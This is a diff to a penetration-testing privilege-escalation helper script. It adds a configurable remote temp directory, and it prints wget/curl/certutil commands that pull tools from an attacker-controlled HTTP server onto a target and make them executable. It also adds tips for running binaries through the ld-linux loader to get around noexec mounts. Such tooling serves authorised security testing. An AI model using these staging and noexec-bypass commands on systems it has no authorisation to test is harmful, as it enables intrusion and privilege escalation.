@@ -51,6 +51,7 @@ PRIVESC_DIR="./privesc"                    # Base output directory
 TOOLS_CACHE="$HOME/.offsec_tools/privesc"    # Cached tool downloads
 HTTP_PORT=8888                             # HTTP server port for tool serving
 SERVE_TIMEOUT=1800                         # Auto-stop HTTP server after 30 min (plenty for engagement transfers)
+REMOTE_TMP="/tmp"                            # Remote writable dir (override with --remote-tmp if /tmp is noexec)
 
 # Tool URLs — verified as of March 2026
 LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
@@ -287,8 +288,8 @@ serve_tools() {
         fname=$(basename "$f")
         if [[ "$fname" == *.sh ]]; then
             echo -e "  ${CYAN}# Linux: wget or curl${NC}"
-            echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O /tmp/${fname} && chmod +x /tmp/${fname}"
-            echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o /tmp/${fname} && chmod +x /tmp/${fname}"
+            echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
+            echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
         elif [[ "$fname" == *.zip ]]; then
             echo -e "  ${CYAN}# Windows: download + unzip${NC}"
             echo -e "  iwr -uri http://${kali_ip}:${HTTP_PORT}/${fname} -Outfile C:\\Users\\Public\\${fname}"
@@ -299,12 +300,31 @@ serve_tools() {
             echo -e "  certutil -urlcache -split -f http://${kali_ip}:${HTTP_PORT}/${fname} C:\\Users\\Public\\${fname}"
         else
             echo -e "  ${CYAN}# Transfer: ${fname}${NC}"
-            echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O /tmp/${fname} && chmod +x /tmp/${fname}"
-            echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o /tmp/${fname} && chmod +x /tmp/${fname}"
+            echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
+            echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
         fi
         echo ""
     done
     echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
+
+    # Print noexec detection + fallback tips
+    if [[ "$REMOTE_TMP" == "/tmp" ]]; then
+        echo ""
+        warn "If ${REMOTE_TMP} is noexec, run this on target to check:"
+        echo -e "  ${CYAN}mount | grep ' ${REMOTE_TMP} ' | grep noexec${NC}"
+        echo ""
+        echo -e "  ${CYAN}# Fallback writable+exec dirs to try:${NC}"
+        echo -e "  ${CYAN}#   /dev/shm, /var/tmp, \$HOME, or cwd${NC}"
+        echo ""
+        echo -e "  ${CYAN}# For shell scripts on noexec mount — run via interpreter:${NC}"
+        echo -e "  bash ${REMOTE_TMP}/linpeas.sh"
+        echo ""
+        echo -e "  ${CYAN}# For ELF binaries on noexec mount — run via ld.so:${NC}"
+        echo -e "  /lib64/ld-linux-x86-64.so.2 ${REMOTE_TMP}/pspy64"
+        echo -e "  /lib/ld-linux.so.2 ${REMOTE_TMP}/pspy32"
+        echo ""
+        echo -e "${BOLD}───────────────────────────────────────────────────${NC}"
+    fi
 
     # Start server in background (subshell avoids changing working directory)
     (cd "$tools_dir" && exec python3 -m http.server "$HTTP_PORT") &>/dev/null &
@@ -420,7 +440,7 @@ find /lib/systemd/system -writable -type f 2>/dev/null
 #----------------------------------------------------------------------
 
 ### linpeas (redirect output — it scrolls fast) ###
-# ./linpeas.sh | tee /tmp/linpeas_output.txt
+# ./linpeas.sh | tee ${REMOTE_TMP}/linpeas_output.txt
 # RED/YELLOW findings = highest priority
 
 ### pspy (catch hidden cron jobs / processes) ###
@@ -1111,6 +1131,7 @@ ${BOLD}OPTIONS:${NC}
   --potato               Print potato variant selection guide
   --no-stage             Skip tool download/staging
   --port <N>             HTTP server port (default: $HTTP_PORT)
+  --remote-tmp <path>    Writable dir on target (default: /tmp; use if /tmp is noexec)
   -h, --help             Show this help
 
 ${BOLD}EXAMPLES:${NC}
@@ -1169,6 +1190,11 @@ main() {
             --no-stage)
                 no_stage=true
                 shift
+                ;;
+            --remote-tmp)
+                [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
+                REMOTE_TMP="$2"
+                shift 2
                 ;;
             --port)
                 [[ $# -lt 2 ]] && { error "Option $1 requires an argument"; exit 1; }
